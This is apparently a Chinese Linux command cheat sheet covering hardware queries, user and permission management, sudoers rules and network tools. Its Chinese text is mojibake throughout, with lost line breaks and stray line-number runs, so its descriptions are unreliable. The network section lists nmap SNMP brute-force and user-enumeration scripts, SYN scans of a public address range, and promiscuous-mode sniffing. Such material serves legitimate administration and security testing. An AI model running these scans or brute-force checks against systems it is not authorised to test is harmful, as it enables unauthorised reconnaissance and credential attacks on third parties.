-m æ˜¾ç¤ºæœºå™¨çš„å¤„ç†å™¨æ¶æ„(2)dmidecode -q æ˜¾ç¤ºç¡¬ä»¶ç³»ç»Ÿéƒ¨ä»¶ (SMBIOS &#x2F; DMI)hdparm -i &#x2F;dev&#x2F;hda ç½—åˆ—ä¸€ä¸ªç£ç›˜çš„æ¶æ„ç‰¹æ€§hdparm -tT &#x2F;dev&#x2F;sda åœ¨ç£ç›˜ä¸Šæ‰§è¡Œæµ‹è¯•æ€§è¯»å–æ“ä½œcat &#x2F;proc&#x2F;cpuinfo æ˜¾ç¤ºCPU infoçš„ä¿¡æ¯cat &#x2F;proc&#x2F;interrupts æ˜¾ç¤ºä¸­æ–­cat &#x2F;proc&#x2F;meminfo æ ¡éªŒå†…å­˜ä½¿ç”¨cat &#x2F;proc&#x2F;swaps æ˜¾ç¤ºå“ªäº›swapè¢«ä½¿ç”¨cat &#x2F;proc&#x2F;version æ˜¾ç¤ºå†…æ ¸çš„ç‰ˆæœ¬cat &#x2F;proc&#x2F;net&#x2F;dev æ˜¾ç¤ºç½‘ç»œé€‚é…å™¨åŠç»Ÿè®¡cat &#x2F;proc&#x2F;mounts æ˜¾ç¤ºå·²åŠ è½½çš„æ–‡ä»¶ç³»ç»Ÿlspci -tv ç½—åˆ— PCI è®¾å¤‡lsusb -tv æ˜¾ç¤º USB è®¾å¤‡ top å®æ—¶æ˜¾ç¤ºç³»ç»Ÿèµ„æºä½¿ç”¨æƒ…å†µã€‚free æŸ¥çœ‹ç³»ç»Ÿå†…å­˜date æ˜¾ç¤ºã€è®¾ç½®ç³»ç»Ÿæ—¶é—´cal æŸ¥çœ‹æ—¥å†ã€æ—¶é—´ä¿¡æ¯cal 2021 æ˜¾ç¤º2021å¹´çš„æ—¥å†è¡¨date 041217002021.00 è®¾ç½®æ—¥æœŸå’Œæ—¶é—´ - æœˆæ—¥æ—¶åˆ†å¹´.ç§’clock -w å°†æ—¶é—´ä¿®æ”¹ä¿å­˜åˆ° BIOS1234567891011121314151617181920212223242526276ã€ç”¨æˆ·ç®¡ç†åŠæƒé™ã€ç”¨æˆ·æˆæƒï¼Œç™»é™†ç›¸å…³å‘½ä»¤ï¼ˆ21ä¸ªï¼‰useradd æ·»åŠ ç”¨æˆ·ã€‚æ·»åŠ ä¸€ä¸ªtomç”¨æˆ·ï¼Œè®¾ç½®å®ƒå±äºusersç»„ï¼Œå¹¶æ·»åŠ æ³¨é‡Šä¿¡æ¯ï¼šuseradd -g users -c â€œhr tomâ€ tomuseradd -c â€œName Surname â€œ -g admin -d &#x2F;home&#x2F;user1 -s &#x2F;bin&#x2F;bash user1 åˆ›å»ºä¸€ä¸ªå±äº â€œadminâ€ ç”¨æˆ·ç»„çš„ç”¨æˆ· usermod ä¿®æ”¹ç³»ç»Ÿå·²ç»å­˜åœ¨ç”¨æˆ·å±æ€§ã€‚ä¿®æ”¹tomç”¨æˆ·çš„ç™»é™†åä¸ºtomcatï¼šusermod -l tomcat tom å°†tomcatæ·»åŠ åˆ°syså’Œrootç»„ï¼ˆ-Gï¼Œ-gï¼‰ä¸­ï¼šusermod -G sys,root tomcatæŸ¥çœ‹tomcatçš„ç»„ä¿¡æ¯ï¼šgroups tomcatusermod -c â€œUser FTPâ€ -g system -d &#x2F;ftp&#x2F;user1 -s &#x2F;bin&#x2F;nologin user1 ä¿®æ”¹ç”¨æˆ·å±æ€§ userdel åˆ é™¤ç”¨æˆ·ã€‚userdel -r spark åŠ ä¸€ä¸ª-rå°±è¡¨ç¤ºæŠŠç”¨æˆ·åŠç”¨æˆ·çš„ä¸»ç›®å½•éƒ½åˆ é™¤ groupadd æ·»åŠ ç”¨æˆ·ç¾¤ç»„+groupmodç»„ä¿®æ”¹passwd ä¿®æ”¹ç”¨æˆ·å¯†ç ã€‚chage ä¿®æ”¹ç”¨æˆ·å¯†ç æœ‰æ•ˆæœŸé™ã€‚id æŸ¥çœ‹ç”¨æˆ·çš„uid&#x2F;gidåŠå½’å±çš„ç”¨æˆ·ç¾¤ç»„123groupmod -n new_group_name old_group_name é‡å‘½åä¸€ä¸ªç”¨æˆ·ç»„ chmod æ”¹å˜æ–‡ä»¶ã€ç›®å½•æƒé™chmod -R 770 aaa&#x2F; ##å¦‚æœè¦å°†ä¸€ä¸ªæ–‡ä»¶å¤¹çš„æ‰€æœ‰å†…å®¹æƒé™ç»Ÿä¸€ä¿®æ”¹ï¼Œåˆ™å¯ä»¥-Rå‚æ•°chmod ugo+rwx directory1 ##è®¾ç½®ç›®å½•çš„æ‰€æœ‰äºº(u)ã€ç¾¤ç»„(g)ä»¥åŠå…¶ä»–äºº(o)ä»¥è¯»ï¼ˆr ï¼‰ã€å†™(w)å’Œæ‰§è¡Œ(x)çš„æƒé™chmod go-rwx directory1 ##åˆ é™¤ç¾¤ç»„(g)ä¸å…¶ä»–äºº(o)å¯¹ç›®å½•çš„è¯»å†™æ‰§è¡Œæƒé™123find &#x2F; -perm -u+s ç½—åˆ—ä¸€ä¸ªç³»ç»Ÿä¸­æ‰€æœ‰ä½¿ç”¨äº†SUIDæ§åˆ¶çš„æ–‡ä»¶chmod u+s &#x2F;bin&#x2F;file1 è®¾ç½®ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶çš„ SUID ä½ - è¿è¡Œè¯¥æ–‡ä»¶çš„ç”¨æˆ·ä¹Ÿè¢«èµ‹äºˆå’Œæ‰€æœ‰è€…åŒæ ·çš„æƒé™chmod u-s &#x2F;bin&#x2F;file1 ç¦ç”¨ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶çš„ SUIDä½chmod g+s &#x2F;home&#x2F;public è®¾ç½®ä¸€ä¸ªç›®å½•çš„SGID ä½ - ç±»ä¼¼SUID ï¼Œä¸è¿‡è¿™æ˜¯é’ˆå¯¹ç›®å½•çš„chmod g-s &#x2F;home&#x2F;public ç¦ç”¨ä¸€ä¸ªç›®å½•çš„ SGID ä½chmod o+t &#x2F;home&#x2F;public è®¾ç½®ä¸€ä¸ªæ–‡ä»¶çš„ STIKY ä½ - åªå…è®¸åˆæ³•æ‰€æœ‰äººåˆ é™¤æ–‡ä»¶chmod o-t &#x2F;home&#x2F;public ç¦ç”¨ä¸€ä¸ªç›®å½•çš„ STIKY ä½chgrp æ›´æ”¹æ–‡ä»¶ç”¨æˆ·ç¾¤ç»„ã€‚12345678chown æ”¹å˜æ–‡ä»¶ã€ç›®å½•çš„å±ä¸»å’Œå±ç»„chown :angela aaa ## æ”¹å˜æ‰€å±ç»„chown angela:angela aaa&#x2F; ## åŒæ—¶ä¿®æ”¹æ‰€å±ç”¨æˆ·å’Œæ‰€å±ç»„chown -R user1 directory1 ##æ”¹å˜ä¸€ä¸ªç›®å½•çš„æ‰€æœ‰äººå±æ€§å¹¶åŒæ—¶æ”¹å˜æ”¹ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶çš„å±æ€§123umask æ˜¾ç¤ºã€è®¾ç½®æƒé™æ©ç ã€‚whoami æ˜¾ç¤ºå½“å‰æœ‰æ•ˆç”¨æˆ·åç§°ï¼Œç›¸å½“äºæ‰§è¡Œid -unå‘½ä»¤ã€‚who æ˜¾ç¤ºç›®å‰å·²ç™»å½•ç³»ç»Ÿçš„ç”¨æˆ·ä¿¡æ¯ã€‚w æ˜¾ç¤ºå·²ç™»é™†ç³»ç»Ÿçš„ç”¨æˆ·åˆ—è¡¨ï¼Œå¹¶æ˜¾ç¤ºç”¨æˆ·æ­£åœ¨æ‰§è¡Œçš„æŒ‡ä»¤ã€‚last æ˜¾ç¤ºå·²ç™»å…¥ç³»ç»Ÿçš„ç”¨æˆ·ã€‚lastlog æ˜¾ç¤ºç³»ç»Ÿä¸­æ‰€æœ‰ç”¨æˆ·æœ€è¿‘ä¸€æ¬¡çš„ç™»å½•ä¿¡æ¯ã€‚users æ˜¾ç¤ºå½“å‰ç™»å½•ç³»ç»Ÿçš„æ‰€æœ‰ç”¨æˆ·çš„ç”¨æˆ·åˆ—è¡¨ã€‚finger æŸ¥æ‰¾ã€æ˜¾ç¤ºç”¨æˆ·ä¿¡æ¯ã€‚12345678gpasswdå°†tomcatç”¨æˆ·ä»rootç»„å’Œsysç»„åˆ é™¤ï¼šgpasswd -d tomcat root&amp;&amp;gpasswd -d tomcat syså°†americaç»„åä¿®æ”¹ä¸ºamï¼šgroupmod -n am america chattr é…ç½®æ–‡ä»¶çš„ç‰¹æ®Šå±æ€§ - ä½¿ç”¨ â€œ+â€ è®¾ç½®æƒé™ï¼Œä½¿ç”¨ â€œ-â€ ç”¨äºå–æ¶ˆchattr +a file1 åªå…è®¸ä»¥è¿½åŠ æ–¹å¼è¯»å†™æ–‡ä»¶chattr +c file1 å…è®¸è¿™ä¸ªæ–‡ä»¶èƒ½è¢«å†…æ ¸è‡ªåŠ¨å‹ç¼©&#x2F;è§£å‹chattr +d file1 åœ¨è¿›è¡Œæ–‡ä»¶ç³»ç»Ÿå¤‡ä»½æ—¶ï¼Œdumpç¨‹åºå°†å¿½ç•¥è¿™ä¸ªæ–‡ä»¶chattr +i file1 è®¾ç½®æˆä¸å¯å˜çš„æ–‡ä»¶ï¼Œä¸èƒ½è¢«åˆ é™¤ã€ä¿®æ”¹ã€é‡å‘½åæˆ–è€…é“¾æ¥chattr +s file1 å…è®¸ä¸€ä¸ªæ–‡ä»¶è¢«å®‰å…¨åœ°åˆ é™¤chattr +S file1 ä¸€æ—¦åº”ç”¨ç¨‹åºå¯¹è¿™ä¸ªæ–‡ä»¶æ‰§è¡Œäº†å†™æ“ä½œï¼Œä½¿ç³»ç»Ÿç«‹åˆ»æŠŠä¿®æ”¹çš„ç»“æœå†™åˆ°ç£ç›˜chattr +u file1 è‹¥æ–‡ä»¶è¢«åˆ é™¤ï¼Œç³»ç»Ÿä¼šå…è®¸ä½ åœ¨ä»¥åæ¢å¤è¿™ä¸ªè¢«åˆ é™¤çš„æ–‡ä»¶lsattr æ˜¾ç¤ºç‰¹æ®Šçš„å±æ€§12345678ä¸ºç”¨æˆ·é…ç½®sudoæƒé™su åˆ‡æ¢ç”¨æˆ·èº«ä»½ã€‚visudo ç¼–è¾‘&#x2F;etc&#x2F;sudoersæ–‡ä»¶çš„ä¸“å±å‘½ä»¤ã€‚sudo ä»¥å¦å¤–ä¸€ç”¨æˆ·èº«ä»½ï¼ˆé»˜è®¤ä¸ºrootç”¨æˆ·ï¼‰æ‰§è¡Œäº‹å…ˆåœ¨sudoersæ–‡ä»¶ä¸­å…è®¸çš„å‘½ä»¤ã€‚123ç”¨rootç¼–è¾‘ vi &#x2F;etc&#x2F;sudoersï¼›ä¸è¿‡ç°åœ¨é»˜è®¤éƒ½ç”¨visudoå‘½ä»¤æ¥ç¼–è¾‘æ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶çš„å¦‚ä¸‹ä½ç½®ï¼Œä¸ºhadoopæ·»åŠ ä¸€è¡Œå³å¯ root ALL&#x3D;(ALL) ALLhadoop ALL&#x3D;(ALL) ALL ç„¶åï¼Œhadoopç”¨æˆ·å°±å¯ä»¥ç”¨sudoæ¥æ‰§è¡Œç³»ç»Ÿçº§åˆ«çš„æŒ‡ä»¤ éªŒè¯ï¼šåˆ‡æ¢åˆ°æˆæƒçš„ç”¨æˆ·ä¸‹ï¼Œæ‰§è¡Œï¼šsudo -l æ¥æŸ¥çœ‹å“ªäº›å‘½ä»¤æ˜¯å¯ä»¥æ‰§è¡Œæˆ–ç¦æ­¢çš„ï¼› sudo -v &#x2F;&#x2F;å¯æ›´æ–°sudoåˆ‡æ¢åçš„æ—¶é—´æˆ³ï¼Œä¸è‡³äºè¿‡æœŸ &#x2F;etc&#x2F;sudoersä¸­æ¯è¡Œå°±ç®—ä¸€ä¸ªè§„åˆ™ï¼Œå¸¦æœ‰#å·å¯ä»¥å½“ä½œæ˜¯è¯´æ˜çš„å†…å®¹ï¼Œä¸ä¼šæ‰§è¡Œï¼›å¦‚æœè§„åˆ™å¾ˆé•¿ï¼Œä¸€è¡Œåˆ—ä¸ä¸‹æ—¶ï¼Œå¯ä»¥ç”¨\\å·æ¥ç»­è¡Œï¼Œè¿™æ ·ä¸€ä¸ªè§„åˆ™å°±å¯ä»¥æœ‰å¤šä¸ªè¡Œï¼›&#x2F;etc&#x2F;sudoers çš„è§„åˆ™å¯åˆ†ä¸ºä¸¤ç±»ï¼›ä¸€ç±»æ˜¯åˆ«åå®šä¹‰ï¼Œå¦ä¸€ç±»æ˜¯æˆæƒè§„åˆ™ï¼›åˆ«åå®šä¹‰å¹¶ä¸æ˜¯å¿…é¡»çš„ï¼Œä½†æˆæƒè§„åˆ™æ˜¯å¿…é¡»çš„ï¼› åˆ«åè§„åˆ™å®šä¹‰æ ¼å¼å¦‚ä¸‹ï¼š Alias_Type NAME &#x3D; item1, item2, â€¦ æˆ–å¦‚ä¸‹è¿™æ ·#Alias_Type NAME &#x3D; item1, item2, item3 : NAME &#x3D; item4, item5 &#x2F;&#x2F;åˆ«åä¹‹é—´ç”¨:å·åˆ†å‰²ï¼› ##åˆ«åç±»å‹ï¼ˆAlias_Typeï¼‰ï¼šåˆ«åç±»å‹åŒ…æ‹¬å¦‚ä¸‹å››ç§ #Host_Alias å®šä¹‰ä¸»æœºåˆ«åï¼› ç”¨äºåœ¨ä¸‹æ–‡å®šä¹‰æˆæƒè§„åˆ™æ—¶é€šè¿‡è¯¥å®šä¹‰ä¸»æœºåˆ«åæ¥é™åˆ¶ç‰¹å®šä¸€ç»„ä¸»æœºï¼Œå¦åˆ™å°±éœ€è¦ç”¨ALLæ¥åŒ¹é…æ‰€æœ‰å¯èƒ½å‡ºç°çš„ä¸»æœºæƒ…å†µ#User_Alias ç”¨æˆ·åˆ«åï¼Œåˆ«åæˆå‘˜å¯ä»¥æ˜¯ç”¨æˆ·ï¼Œç”¨æˆ·ç»„ï¼ˆå‰é¢è¦åŠ %å·ï¼‰ï¼Œæˆå‘˜ä¸æˆå‘˜ä¹‹é—´ï¼Œé€šè¿‡åŠè§’,å·åˆ†éš”ï¼›;ä¸”éœ€è¦åœ¨ç³»ç»Ÿä¸­ç¡®å®åœ¨å­˜åœ¨çš„ï¼Œå³ï¼›åœ¨&#x2F;etc&#x2F;paswdä¸­å¿…é¡»å­˜åœ¨#Runas_Alias ç”¨æ¥å®šä¹‰runasåˆ«åï¼Œè¿™ä¸ªåˆ«åæŒ‡å®šçš„æ˜¯â€œç›®çš„ç”¨æˆ·â€ï¼Œå³sudo å…è®¸åˆ‡æ¢è‡³çš„ç”¨æˆ·ï¼› å®šä¹‰çš„æ˜¯æŸä¸ªç³»ç»Ÿç”¨æˆ·å¯ä»¥sudo åˆ‡æ¢èº«ä»½åˆ°Runas_Alias ä¸‹çš„æˆå‘˜#Cmnd_Alias å®šä¹‰å‘½ä»¤åˆ«åï¼›æ³¨æ„ï¼šå‘½ä»¤åˆ«åä¸‹çš„æˆå‘˜å¿…é¡»æ˜¯æ–‡ä»¶æˆ–ç›®å½•çš„ç»å¯¹è·¯å¾„ï¼› åˆ«åé•¿çš„è¯ï¼Œå¯ä»¥é€šè¿‡ \\ å·æ–­è¡Œï¼› Cmnd_Alias USERMAG&#x3D;&#x2F;usr&#x2F;sbin&#x2F;adduser,&#x2F;usr&#x2F;sbin&#x2F;userdel,&#x2F;usr&#x2F;bin&#x2F;passwd [A-Za-z]*,&#x2F;bin&#x2F;chown,&#x2F;bin&#x2F;chmodCmnd_Alias DISKMAG&#x3D;&#x2F;sbin&#x2F;fdisk,&#x2F;sbin&#x2F;partedCmnd_Alias NETMAG&#x3D;&#x2F;sbin&#x2F;ifconfig,&#x2F;etc&#x2F;init.d&#x2F;networkCmnd_Alias KILL &#x3D; &#x2F;usr&#x2F;bin&#x2F;killCmnd_Alias PWMAG &#x3D; &#x2F;usr&#x2F;sbin&#x2F;reboot,&#x2F;usr&#x2F;sbin&#x2F;haltCmnd_Alias SHELLS &#x3D; &#x2F;usr&#x2F;bin&#x2F;sh, &#x2F;usr&#x2F;bin&#x2F;csh, &#x2F;usr&#x2F;bin&#x2F;ksh, \\ &#x2F;usr&#x2F;local&#x2F;bin&#x2F;tcsh, &#x2F;usr&#x2F;bin&#x2F;rsh, \\ &#x2F;usr&#x2F;local&#x2F;bin&#x2F;zshCmnd_Alias SU &#x3D; &#x2F;usr&#x2F;bin&#x2F;su,&#x2F;bin,&#x2F;sbin,&#x2F;usr&#x2F;sbin,&#x2F;usr&#x2F;bin ##æˆæƒè§„åˆ™è¯­æ³•ï¼šæˆæƒç”¨æˆ· ä¸»æœº&#x3D;å‘½ä»¤åŠ¨ä½œï¼Œåœ¨åŠ¨ä½œä¹‹å‰ä¹Ÿå¯ä»¥æŒ‡å®šåˆ‡æ¢åˆ°ç‰¹å®šç”¨æˆ·ä¸‹ï¼Œåœ¨è¿™é‡ŒæŒ‡å®šåˆ‡æ¢çš„ç”¨æˆ·è¦ç”¨æ‹¬å·æ‹¬èµ·æ¥ï¼Œå¦‚æœä¸éœ€è¦å¯†ç ç›´æ¥è¿è¡Œå‘½ä»¤çš„ï¼Œåº”è¯¥åŠ NOPASSWD:å‚æ•°ZQadmin ALL&#x3D;&#x2F;bin&#x2F;chown,&#x2F;bin&#x2F;chmod ##è¡¨ç¤ºZQadminå¯ä»¥åœ¨ä»»ä½•å¯èƒ½å‡ºç°çš„ä¸»æœºåçš„ç³»ç»Ÿä¸­ï¼Œå¯ä»¥åˆ‡æ¢åˆ°rootç”¨æˆ·ä¸‹æ‰§è¡Œ&#x2F;bin&#x2F;chown å’Œ&#x2F;bin&#x2F;chmod å‘½ä»¤ï¼›è¿™é‡Œçœç•¥äº†æŒ‡å®šåˆ‡æ¢åˆ°å“ªä¸ªç”¨æˆ·ä¸‹æ‰§è¡Œ&#x2F;bin&#x2F;shown å’Œ&#x2F;bin&#x2F;chmodå‘½ä»¤ï¼›åœ¨çœç•¥çš„æƒ…å†µä¸‹é»˜è®¤ä¸ºæ˜¯åˆ‡æ¢åˆ°rootç”¨æˆ·ä¸‹æ‰§è¡Œï¼›åŒæ—¶ä¹Ÿçœç•¥äº†æ˜¯ä¸æ˜¯éœ€è¦ZQadminç”¨æˆ·è¾“å…¥éªŒè¯å¯†ç ï¼Œå¦‚æœçœç•¥äº†ï¼Œé»˜è®¤ä¸ºæ˜¯éœ€è¦éªŒè¯å¯†ç ã€‚ #å› æ­¤æˆæƒè§„åˆ™å¯ä»¥è¿™æ ·å†™ï¼šæˆæƒç”¨æˆ· ä¸»æœº&#x3D;[(åˆ‡æ¢åˆ°å“ªäº›ç”¨æˆ·æˆ–ç”¨æˆ·ç»„)] [æ˜¯å¦éœ€è¦å¯†ç éªŒè¯] å‘½ä»¤1,[(åˆ‡æ¢åˆ°å“ªäº›ç”¨æˆ·æˆ–ç”¨æˆ·ç»„)] [æ˜¯å¦éœ€è¦å¯†ç éªŒè¯] [å‘½ä»¤2],[(åˆ‡æ¢åˆ°å“ªäº›ç”¨æˆ·æˆ–ç”¨æˆ·ç»„)] [æ˜¯å¦éœ€è¦å¯†ç éªŒè¯] [å‘½ä»¤3]â€¦â€¦ &#x2F;&#x2F;[ ]ä¸­çš„å†…å®¹ï¼Œæ˜¯å¯ä»¥çœç•¥ï¼›å‘½ä»¤ä¸å‘½ä»¤ä¹‹é—´ç”¨,å·åˆ†éš”ï¼›ZQadmin ALL&#x3D;(root) NOPASSWD:&#x2F;bin&#x2F;chown, &#x2F;bin&#x2F;chmod ##&#x2F;&#x2F;æ‰§è¡Œchownä¸éœ€è¾“å…¥å¯†ç ï¼Œæ‰§è¡Œchmodæ—¶éœ€è¦ZQadminè¾“å…¥è‡ªå·±çš„å¯†ç %admin ALL&#x3D;&#x2F;usr&#x2F;sbin&#x2F;,&#x2F;sbin&#x2F; ##è¡¨ç¤ºadminç”¨æˆ·ç»„ä¸‹çš„æ‰€æœ‰æˆå‘˜ï¼Œåœ¨æ‰€æœ‰å¯èƒ½çš„å‡ºç°çš„ä¸»æœºåä¸‹ï¼Œéƒ½èƒ½åˆ‡æ¢åˆ°rootç”¨æˆ·ä¸‹è¿è¡Œ &#x2F;usr&#x2F;sbinå’Œ&#x2F;sbinç›®å½•ä¸‹çš„æ‰€æœ‰å‘½ä»¤ï¼›wangju ALL&#x3D;&#x2F;usr&#x2F;sbin&#x2F;,&#x2F;sbin&#x2F;,!&#x2F;usr&#x2F;sbin&#x2F;fdisk #&#x2F;&#x2F;è¡¨ç¤ºwangjuç”¨æˆ·åœ¨æ‰€æœ‰å¯èƒ½å­˜åœ¨çš„ä¸»æœºåçš„ä¸»æœºä¸Šè¿è¡Œ&#x2F;usr&#x2F;sbinå’Œ&#x2F;sbinä¸‹æ‰€æœ‰çš„ç¨‹åºï¼Œä½†fdisk ç¨‹åºé™¤å¤–ï¼› #æŒ‰åˆ«åæ¥å»ºç«‹è§„åˆ™,bå†™æ˜é¦–ä½å¿…é¡»ä¸ºå¤§å†™å­—æ¯ï¼Œå…¶åå¯è·Ÿä¸‹åˆ’çº¿å’Œæ•°å­—User_Alias SYSADER&#x3D;admin,linuxsir,%adminUser_Alias DISKADER&#x3D;lanhaitunRunas_Alias OP&#x3D;root #&#x2F;å®šä¹‰è¦ä¸´æ—¶suçš„ç›®æ ‡ç”¨æˆ·çš„åˆ«åä¸ºOPï¼Œå®é™…æˆå‘˜ä¸ºrootCmnd_Alias SYUCMD&#x3D;&#x2F;bin&#x2F;chown,&#x2F;bin&#x2F;chmod,&#x2F;usr&#x2F;sbin&#x2F;adduser,&#x2F;usr&#x2F;bin&#x2F;passwd [A-Za-z]*,!&#x2F;usr&#x2F;bin&#x2F;passwd root #&#x2F;ä¸èƒ½é€šè¿‡passwd æ¥æ›´æ”¹rootå¯†ç ï¼›Cmnd_Alias DSKCMD&#x3D;&#x2F;sbin&#x2F;parted,&#x2F;sbin&#x2F;fdisk #æ³¨ï¼šå®šä¹‰å‘½ä»¤åˆ«åDSKCMDï¼Œä¸‹æœ‰æˆå‘˜partedå’Œfdisk ï¼› å®šä¹‰åˆ«åè§„åˆ™SYSADMIN ALL&#x3D; SYUCMD,DSKCMD #&#x2F;adminã€linuxsirå’Œadminç”¨æˆ·ç»„ä¸‹çš„æˆå‘˜èƒ½ä»¥rootèº«ä»½è¿è¡Œchown ã€chmod ã€adduserã€passwdï¼Œä½†ä¸èƒ½æ›´æ”¹rootçš„å¯†ç ï¼›ä¹Ÿå¯ä»¥ä»¥rootèº«ä»½è¿è¡Œ partedå’ŒfdiskDISKADER ALL&#x3D;(OP) DSKCMD#SYSADMIN ALL&#x3D; NOPASSWD:SYDCMD,NOPASSWD:DSKCMD&#x2F;&#x2F;ä¸ç”¨è¾“å…¥å¯†ç  123456789101112131415161718192021222324252627282930313233343536373839404142å…¶ä»–chage -E 2005-12-31 user1 è®¾ç½®ç”¨æˆ·å£ä»¤çš„å¤±æ•ˆæœŸé™pwck æ£€æŸ¥ â€˜&#x2F;etc&#x2F;passwdâ€™ çš„æ–‡ä»¶æ ¼å¼å’Œè¯­æ³•ä¿®æ­£ä»¥åŠå­˜åœ¨çš„ç”¨æˆ·grpck æ£€æŸ¥ â€˜&#x2F;etc&#x2F;passwdâ€™ çš„æ–‡ä»¶æ ¼å¼å’Œè¯­æ³•ä¿®æ­£ä»¥åŠå­˜åœ¨çš„ç¾¤ç»„newgrp group_name ç™»é™†è¿›ä¸€ä¸ªæ–°çš„ç¾¤ç»„ä»¥æ”¹å˜æ–°åˆ›å»ºæ–‡ä»¶çš„é¢„è®¾ç¾¤ç»„12347ã€åŸºç¡€ç½‘ç»œæ“ä½œå‘½ä»¤ï¼ˆ11ä¸ªï¼‰telnet ç”¨TELNETåè®®è¿œç¨‹ç™»å½•ã€‚ssh ç”¨SSHåŠ å¯†åè®®è¿œç¨‹ç™»å½•ã€‚scp å…¨æ‹¼ä¸ºsecure copyï¼Œç”¨äºä¸åŒä¸»æœºä¹‹é—´å¤åˆ¶æ–‡ä»¶ã€‚wget ç”¨å‘½ä»¤è¡Œä¸‹è½½æ–‡ä»¶ã€‚ping æµ‹è¯•ä¸»æœºä¹‹é—´ç½‘ç»œçš„è¿é€šæ€§ã€‚route æ˜¾ç¤ºå’Œè®¾ç½®linuxç³»ç»Ÿçš„è·¯ç”±è¡¨ã€‚ifup å¯åŠ¨ç½‘å¡ã€‚ifdown å…³é—­ç½‘å¡dhclient eth0 ä»¥dhcpæ¨¡å¼å¯ç”¨ â€˜eth0â€™ip link show æ˜¾ç¤ºæ‰€æœ‰ç½‘å£é“¾è·¯çŠ¶æ€mii-tool eth0 æ˜¾ç¤ºeth0çš„é“¾è·¯çŠ¶æ€ethtool eth0 æ˜¾ç¤ºeth0ç½‘å¡æ•°æ®ç»Ÿè®¡iwlist scan æ˜¾ç¤ºæ— çº¿ç½‘ç»œiwconfig eth1 æ˜¾ç¤ºeth1çš„æ— çº¿ç½‘å¡çš„é…ç½®whois www.baidu.com åœ¨ Whois æ•°æ®åº“ä¸­æŸ¥æ‰¾nbtscan ip_addr netbiosè§£æ ï¼ˆwindowsï¼‰nmblookup -A ip_addr netbiosæŸ¥çœ‹ï¼ˆwindowsï¼‰smbclient -L ip_addr&#x2F;hostname æ˜¾ç¤º Windows ä¸»æœºçš„è¿œç¨‹å…±äº«smbget -Rr smb:&#x2F;&#x2F;ip_addr&#x2F;share é€šè¿‡ smb ä»ä¸»æœº windows ä¸‹è½½æ–‡ä»¶ ifconfig æŸ¥çœ‹ã€é…ç½®ã€å¯ç”¨æˆ–ç¦ç”¨ç½‘ç»œæ¥å£çš„å‘½ä»¤ifconfig eth0 promisc è®¾ç½® â€˜eth0â€™ æˆæ··æ‚æ¨¡å¼ä»¥å—…æ¢æ•°æ®åŒ… (sniffing) route è·¯ç”±ç®¡ç†route -n show routing tableroute add -net 0&#x2F;0 gw IP_Gateway configura default gatewayroute add -net 192.168.0.0 netmask 255.255.0.0 gw 192.168.1.1 configure static route to reach network â€˜192.168.0.0&#x2F;16â€™route del 0&#x2F;0 gw IP_gateway remove static routeecho â€œ1â€ &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward activate ip routing12345netstat æŸ¥çœ‹ç½‘ç»œçŠ¶æ€1ï¼‰æŸ¥çœ‹æŸä¸ªæœåŠ¡çš„TCPè¿æ¥æ•°#netstat -an | grep ESTABLISHED | grep â€˜:80â€™ | wc -l netstat -nu &#x2F;&#x2F;æŸ¥çœ‹udpçš„è¿æ¥æ•° 3ï¼‰æŸ¥çœ‹ç½‘å¡åˆ—è¡¨: netstat -i æ˜¾ç¤ºç»„æ’­ç»„çš„å…³ç³»:netstat -gss æŸ¥çœ‹ç½‘ç»œçŠ¶æ€1ï¼‰ss -ta &#x2F;&#x2F;æ£€æµ‹å¥—æ¥å­— 2ï¼‰æ˜¾ç¤ºæ‰€æœ‰æ´»åŠ¨çš„TCPè¿æ¥ä»¥åŠè®¡æ—¶å™¨:ss -to nmap ç½‘ç»œæ‰«æå‘½ä»¤#å¼±å£ä»¤æ£€æµ‹nmap â€“sU â€“p161 â€“script&#x3D;snmp-brute ip &#x2F;&#x2F;æŸ¥æ‰¾snmpå¼±å£ä»¤,U:udp;#å¼±å£ä»¤åˆ©ç”¨nmap -sU -p161 â€“script&#x3D;snmp-netstat ip &#x2F;&#x2F;è·å–ç½‘ç»œç«¯å£çŠ¶æ€æ–‡ç« æ¥æºç«™ç‚¹nmap â€“sU â€“p161 â€“script&#x3D;snmp-sysdescr ip &#x2F;&#x2F;è·å–ç³»ç»Ÿä¿¡æ¯nmap -sU -p161 â€“script&#x3D;snmp-win32-user ip &#x2F;&#x2F;è·å–ç”¨æˆ·ä¿¡æ¯#æ‰¹é‡pingæ‰«ænmap -sP 192.168.10.0&#x2F;24nmap -sL 192.168.10.0&#x2F;24 &#x2F;&#x2F;ä»…åˆ—å‡ºæŒ‡å®šç½‘ç»œä¸Šçš„æ¯å°ä¸»æœºï¼Œä¸å‘é€ä»»ä½•æŠ¥æ–‡åˆ°ç›®æ ‡ä¸»æœºï¼ˆéšè”½æ¢æµ‹ï¼‰nmap -PS -p 22,23,2,80 39.156.66.18 &#x2F;&#x2F;æ¢æµ‹ç›®æ ‡ä¸»æœºå¼€æ”¾çš„ç«¯å£,é»˜è®¤æƒ…å†µä¸‹nmapåªæ‰«æTCPç«¯å£nmap -sS 39.156.66.0&#x2F;24 &#x2F;&#x2F;S:ä½¿ç”¨SYNåŠå¼€æ”¾æ‰«æ,T:tcpnmap -sO 39.156.66.0&#x2F;24 &#x2F;&#x2F;æ¢æµ‹ç›®æ ‡ä¸»æœºæ”¯æŒå“ªäº›IPåè®®nmap -vv nmap 192.168.10.1 192.168.10.2 192.168.10.3 &#x2F;&#x2F;æ‰«æå¤šå°ä¸»æœºnmap 192.168.10.1,2,3nmap 192.168.10.* â€“exclude 192.168.10.10 &#x2F;&#x2F;æ‰§è¡Œå…¨ç½‘æ‰«ææˆ–ç”¨é€šé…ç¬¦æ‰«ææ—¶ä½ å¯ä»¥ä½¿ç”¨â€œ-excludeâ€é€‰é¡¹æ¥æ’é™¤æŸäº›ä½ ä¸æƒ³è¦æ‰«æçš„ä¸»æœºnmap -A 192.168.10.11 &#x2F;&#x2F;-Aå¯ç”¨æ“ä½œç³»ç»Ÿå’Œç‰ˆæœ¬æ£€æµ‹ï¼Œè„šæœ¬æ‰«æå’Œè·¯ç”±è·Ÿè¸ªåŠŸèƒ½,â€œ-Oâ€å’Œâ€œ-osscan-guessâ€ä¹Ÿå¸®åŠ©æ¢æµ‹æ“ä½œç³»ç»Ÿä¿¡æ¯nmap -sA 192.168.10.11 